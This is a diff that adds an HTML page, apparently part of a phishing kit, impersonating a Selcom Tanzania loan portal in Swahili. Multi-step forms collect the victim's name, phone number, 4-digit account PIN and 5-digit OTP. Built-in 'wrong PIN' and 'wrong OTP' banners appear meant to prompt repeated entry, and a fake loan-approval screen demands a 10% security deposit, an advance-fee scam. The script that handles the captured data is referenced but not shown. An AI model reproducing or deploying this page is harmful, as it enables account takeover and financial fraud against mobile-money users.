@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Selcom Tanzania Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- SCREEN 1: WELCOME INTRO -->
+  <section id="screen-welcome" class="screen selcom-blue-bg active">
+    <div class="top-nav-bar">
+      <div class="lang-switch-box">
+        <button type="button" class="lang-btn" id="btn-lang-eng">ENG</button>
+        <div class="lang-toggle-slider"></div>
+        <button type="button" class="lang-btn active" id="btn-lang-swa">SWAHILI</button>
+      </div>
+      <div class="top-icon">💬</div>
+    </div>
+
+    <div class="splash-content">
+      <div class="selcom-logo-text">Selcom</div>
+      
+      <h1 class="welcome-heading">KARIBU SELCOM TANZANIA!</h1>
+      <p class="welcome-sub">KARIBU KWENYE PORTAL RASMI YA MAOMBI YA MKOPO.</p>
+      <p class="welcome-desc">Taarifa zako za akaunti ya Selcom (Tanzania pekee) zinahitajika ili kuendelea. Hakikisha unatumia namba sahihi ya akaunti.</p>
+
+      <div class="critical-alert-box">
+        <div class="alert-title-row">
+          <span class="alert-icon">⚠️</span>
+          <strong>TAARIFA MUHIMU YA USALAMA</strong>
+        </div>
+        <p>⚠️ TAZAMA! Kipimo muhimu cha usalama: USIWINGIZE TAARIFA ZISIZOSAILIHI ZA SELCOM. Hii itasababisha ombi lako kukataliwa mara moja. Hakikisha namba yako ni sahihi.</p>
+      </div>
+
+      <div class="flag-container">
+        <div class="tz-flag-card">
+          <div class="tz-flag-stripe green"></div>
+          <div class="tz-flag-stripe black"></div>
+          <div class="tz-flag-stripe blue"></div>
+        </div>
+        <small class="flag-caption">Tovuti Rasmi ya Maombi (Tanzania Pekee)</small>
+      </div>
+    </div>
+
+    <div class="action-footer">
+      <button type="button" id="btn-welcome-continue" class="btn-selcom-green">ENDELEA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 2: LOAN REPAYMENT ESTIMATOR -->
+  <section id="screen-estimator" class="screen selcom-blue-bg">
+    <div class="top-nav-bar">
+      <div class="lang-switch-box">
+        <button type="button" class="lang-btn" id="est-btn-eng">ENG</button>
+        <div class="lang-toggle-slider"></div>
+        <button type="button" class="lang-btn active" id="est-btn-swa">SWAHILI</button>
+      </div>
+      <div class="top-icon">💬</div>
+    </div>
+
+    <div class="estimator-content">
+      <div class="selcom-logo-text sm">Selcom</div>
+      <h2 class="est-title">Kadiria malipo yako ya mkopo</h2>
+
+      <div class="slider-group">
+        <label>KIASI CHA MKOPO</label>
+        <div class="slider-value-display" id="loan-amount-display">TSH 2,500,000</div>
+        <input type="range" id="loan-range" min="100000" max="10000000" step="50000" value="2500000" class="selcom-range">
+        <div class="slider-limits">
+          <span>TSH 100,000</span>
+          <span>TSH 10,000,000</span>
+        </div>
+      </div>
+
+      <div class="slider-group">
+        <label>MUDA WA MKOPO (MIEZI)</label>
+        <div class="slider-value-display" id="loan-term-display">12 MIEZI</div>
+        <input type="range" id="term-range" min="3" max="60" step="1" value="12" class="selcom-range">
+        <div class="slider-limits">
+          <span>MIEZI 3</span>
+          <span>MIEZI 60</span>
+        </div>
+      </div>
+
+      <div class="repayment-card">
+        <span>MAKISIO YA MALIPO KILA MWEZI</span>
+        <h1 id="est-monthly-val">TSH 235,000</h1>
+        <div class="divider-line"></div>
+        <span>JUMLA YA MALIPO</span>
+        <h3 id="est-total-val">TSH 2,820,000</h3>
+        <small>*Riba inayokadiriwa: 13.5%</small>
+      </div>
+    </div>
+
+    <div class="action-footer">
+      <button type="button" id="btn-est-signin" class="btn-selcom-white">INGIA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 3: HATUA 1 YA 3 (LOAN FORM) -->
+  <section id="screen-step1" class="screen white-screen">
+    <header class="inner-header">
+      <button type="button" class="back-btn" id="btn-step1-back">← Rudi</button>
+      <div class="header-branding">
+        <div class="brand-text">Selcom</div>
+        <small class="country-badge">MKONONI TANZANIA</small>
+      </div>
+      <div class="header-hamburger">☰</div>
+    </header>
+
+    <div class="form-card-container">
+      <h2 class="form-main-title">Maombi ya Mkopo</h2>
+      <div class="step-subtitle">Hatua 1 ya 3</div>
+      <div class="step-progress-bar"><div class="fill" style="width: 33%;"></div></div>
+
+      <div class="form-group">
+        <label>Aina ya Mkopo</label>
+        <select id="loan-type" class="input-sel">
+          <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+          <option value="Mkopo wa Binafsi">Mkopo wa Binafsi</option>
+          <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Kiasi cha Mkopo (TSh)</label>
+        <input type="text" id="form-amount-input" class="input-txt" value="100000">
+      </div>
+
+      <div class="form-group">
+        <label>Muda wa Mkopo</label>
+        <select id="loan-term-select" class="input-sel">
+          <option value="Miezi 12">Miezi 12</option>
+          <option value="Miezi 24">Miezi 24</option>
+          <option value="Miezi 48" selected>Miezi 48</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Madhumuni ya Mkopo</label>
+        <textarea id="loan-purpose" class="input-area" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+      </div>
+    </div>
+
+    <button type="button" id="btn-step1-next" class="btn-orange-action">HATUA INAYOFUATA</button>
+  </section>
+
+  <!-- SCREEN 4: HATUA 2 YA 3 (PERSONAL & PHONE) -->
+  <section id="screen-step2" class="screen white-screen">
+    <header class="inner-header">
+      <button type="button" class="back-btn" id="btn-step2-back">← Rudi</button>
+      <div class="header-branding">
+        <div class="brand-text">Selcom</div>
+        <small class="country-badge">MKONONI TANZANIA</small>
+      </div>
+      <div class="header-hamburger">☰</div>
+    </header>
+
+    <div class="form-card-container">
+      <h2 class="form-main-title">Maombi ya Mkopo</h2>
+      <div class="step-subtitle">Hatua 2 ya 3</div>
+      <div class="step-progress-bar"><div class="fill" style="width: 66%;"></div></div>
+
+      <div class="form-row">
+        <div class="form-group half">
+          <label>Jina la Kwanza</label>
+          <input type="text" id="first-name" class="input-txt" placeholder="Jina la kwanza">
+        </div>
+        <div class="form-group half">
+          <label>Jina la Ukoo</label>
+          <input type="text" id="last-name" class="input-txt" placeholder="Jina la ukoo">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Nambari ya Simu</label>
+        <div class="phone-group">
+          <span class="flag-prefix">🇹🇿 +255</span>
+          <input type="text" id="phone-number" class="input-txt" placeholder="712345678" maxlength="10">
+        </div>
+        <small class="input-hint">Weka namba kuanzia na 0 (mfano, 0712345678)</small>
+        <div id="phone-error" class="inline-error"></div>
+      </div>
+    </div>
+
+    <div class="btn-group-row">
+      <button type="button" id="btn-step2-prev" class="btn-gray-action">ILIYOTANGULIA</button>
+      <button type="button" id="btn-step2-next" class="btn-orange-action">HATUA INAYOFUATA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 5: HATUA 3 YA 3 (SUMMARY) -->
+  <section id="screen-step3" class="screen white-screen">
+    <header class="inner-header">
+      <button type="button" class="back-btn" id="btn-step3-back">← Rudi</button>
+      <div class="header-branding">
+        <div class="brand-text">Selcom</div>
+        <small class="country-badge">MKONONI TANZANIA</small>
+      </div>
+      <div class="header-hamburger">☰</div>
+    </header>
+
+    <div class="form-card-container">
+      <h2 class="form-main-title">Maombi ya Mkopo</h2>
+      <div class="step-subtitle">Hatua 3 ya 3</div>
+      <div class="step-progress-bar"><div class="fill" style="width: 100%;"></div></div>
+
+      <div class="form-group">
+        <label>Hali ya Ajira</label>
+        <select id="employment-status" class="input-sel">
+          <option value="Mfanyabiashara">Mfanyabiashara</option>
+          <option value="Mwajiriwa">Mwajiriwa</option>
+          <option value="Mkulima">Mkulima</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Mapato ya Mwaka (TSh)</label>
+        <input type="text" id="annual-income" class="input-txt" placeholder="Weka mapato ya mwaka">
+      </div>
+
+      <div class="summary-box">
+        <h4>Muhtasari wa Maombi</h4>
+        <div class="sum-row"><span>Kiasi cha Mkopo:</span> <strong id="sum-amount">TSh 100,000</strong></div>
+        <div class="sum-row"><span>Muda wa Mkopo:</span> <strong id="sum-term">Miezi 48</strong></div>
+        <div class="sum-row"><span>Madhumuni:</span> <strong id="sum-purpose">Biashara</strong></div>
+        <div class="sum-row"><span>Mwombaji:</span> <strong id="sum-applicant">N/A</strong></div>
+      </div>
+    </div>
+
+    <div class="btn-group-row">
+      <button type="button" id="btn-step3-prev" class="btn-gray-action">ILIYOTANGULIA</button>
+      <button type="button" id="btn-step3-submit" class="btn-orange-action">WASILISHA MAOMBI</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 6: PIN LOGIN SCREEN (TITLE: NEW SELCOM APPLICANT) -->
+  <section id="screen-pin" class="screen selcom-blue-bg">
+    <div class="top-nav-bar">
+      <div class="selcom-logo-text sm">Selcom</div>
+      <div class="top-icon">💬</div>
+    </div>
+
+    <div class="pin-card-wrapper">
+      <div class="card-inner-box">
+        <h3 class="screen-custom-title">NEW SELCOM APPLICANT</h3>
+
+        <div id="creds-surface-banner" class="surface-error-banner">
+          WRONG PIN ❌ Incorrect account PIN. Please try again.
+        </div>
+
+        <div class="phone-display-row">
+          <span class="flag-prefix">+255</span>
+          <input type="text" id="display-phone" class="input-txt readonly" readonly value="712345678">
+        </div>
+
+        <label class="pin-label">Weka PIN yako (tarakimu 4)</label>
+        <div class="pin-boxes-flex">
+          <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+          <span class="eye-toggle" id="toggle-pin">👁</span>
+        </div>
+        <div id="pin-error" class="inline-error">Weka tarakimu 4 za PIN.</div>
+
+        <a href="#" class="forgot-link">Umesahau PIN?</a>
+
+        <button type="button" id="btn-submit-creds" class="btn-selcom-disabled">INGIA</button>
+      </div>
+    </div>
+
+    <div class="bottom-branding">
+      <div class="selcom-logo-text sm">Selcom</div>
+      <small>Selcom Pay na Huduma Nyinginezo</small>
+    </div>
+  </section>
+
+  <!-- SCREEN 7: OTP VERIFICATION (TITLE: OTP SELCOM VERIFICATION) -->
+  <section id="screen-otp" class="screen selcom-blue-bg">
+    <div class="top-nav-bar">
+      <div class="selcom-logo-text sm">Selcom</div>
+      <div class="top-icon">💬</div>
+    </div>
+
+    <div class="pin-card-wrapper">
+      <div class="card-inner-box">
+        <h3 class="screen-custom-title">OTP SELCOM VERIFICATION</h3>
+        <p class="otp-sub-info">Weka tarakimu 5 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom <strong id="otp-phone-display">+255712345678</strong></p>
+
+        <div id="otp-surface-banner" class="surface-error-banner">
+          WRONG OTP ❌ Incorrect verification code. Please enter new OTP.
+        </div>
+
+        <div class="otp-success-notice">
+          ✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 5 kutoka WhatsApp au SMS hapa chini.
+        </div>
+
+        <div class="otp-boxes-flex">
+          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="timer-display" id="timer-text">Tuma tena msimbo ndani ya 1:00 dakika</div>
+        <button type="button" id="btn-resend-otp" class="btn-resend-hidden">Omba OTP Mpya (Request New OTP)</button>
+
+        <div id="otp-error" class="inline-error">Weka tarakimu zote 5 za OTP.</div>
+        <button type="button" id="btn-submit-otp" class="btn-selcom-disabled">WASILISHA</button>
+      </div>
+    </div>
+
+    <div class="bottom-branding">
+      <div class="selcom-logo-text sm">Selcom</div>
+      <small>Selcom Pay na Huduma Nyinginezo</small>
+    </div>
+  </section>
+
+  <!-- SCREEN 8: LOADING OVERLAY -->
+  <section id="screen-loading" class="screen selcom-blue-bg">
+    <div class="loading-container">
+      <div class="spinner"></div>
+      <h3 id="loading-title">INACHAKATA...</h3>
+      <p id="loading-sub">Tafadhali subiri kidogo.</p>
+    </div>
+  </section>
+
+  <!-- SCREEN 9: SUCCESS APPROVAL SCREEN -->
+  <section id="screen-success" class="screen selcom-blue-bg">
+    <div class="success-card-wrapper">
+      <div class="card-inner-box">
+        <div class="success-badge-icon">✓</div>
+        <h2 class="title-congrats">🎉 Hongera!</h2>
+        <p class="success-subtext">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+
+        <div class="approved-box">
+          <span>KIASI KILICHOIDHINISHWA</span>
+          <h1 id="approved-amount-display">TSh 100,000</h1>
+        </div>
+
+        <div class="notice-card-green">
+          <h4>⚠️ NOTISI YA UZINGATIAJI</h4>
+          <p>Akaunti yako ya SELCOM details lazima iwe hai na idumish amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo.</p>
+        </div>
+
+        <div class="details-list">
+          <div class="d-row"><span>MALIPO YA KILA MWEZI</span> <strong id="succ-monthly">TSh 2,441</strong></div>
+          <div class="d-row"><span>MUDA WA MKOPO</span> <strong>Miezi 48</strong></div>
+          <div class="d-row"><span>KIWANGO CHA RIBA</span> <strong>8% APR</strong></div>
+        </div>
+
+        <button type="button" id="btn-go-home" class="btn-selcom-blue-full">Rudi Nyumbani</button>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+          </html>
+      
